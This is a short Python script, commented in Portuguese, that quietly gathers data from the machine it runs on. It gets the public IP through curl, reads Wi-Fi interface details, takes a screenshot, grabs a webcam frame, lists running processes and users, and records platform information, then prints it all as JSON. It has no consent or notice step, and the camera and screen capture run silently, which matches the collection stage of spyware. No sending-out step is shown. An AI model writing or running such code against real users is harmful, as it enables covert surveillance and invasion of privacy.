import os
import json
import datetime
import socket
import subprocess
import base64
import cv2
import numpy as np
import pyautogui
import time
import threading
import io
import platform
import psutil

def coletar_ip():
    try:
        # Obtém IP público
        ip = subprocess.check_output("curl -s ifconfig.me").decode().strip()
        return ip
    except:
        return None

def coletar_wifi():
    try:
        # Captura informações do WiFi
        result = subprocess.check_output("netsh wlan show interfaces").decode()
        return result
    except:
        return None

def capturar_tela():
    try:
        # Captura tela
        screenshot = pyautogui.screenshot()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_bytes = img_byte_arr.getvalue()
        return base64.b64encode(img_bytes).decode('utf-8')
    except:
        return None

def capturar_camera():
    try:
        # Captura câmera
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            img_bytes = buffer.tobytes()
            return base64.b64encode(img_bytes).decode('utf-8')
    except:
        return None

def coletar_processos():
    try:
        # Captura processos
        processos = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            processos.append(proc.info)
        return processos
    except:
        return None

def coletar_informacoes():
    dados = {
        "timestamp": datetime.datetime.now().isoformat(),
        "ip": coletar_ip(),
        "wifi": coletar_wifi(),
        "tela": capturar_tela(),
        "camera": capturar_camera(),
        "processos": coletar_processos(),
        "plataforma": platform.system(),
        "versao": platform.version(),
        "maquina": platform.machine(),
        "processador": platform.processor()
    }
    return dados

if __name__ == "__main__":
    dados = coletar_informacoes()
    print(json.dumps(dados, indent=2))
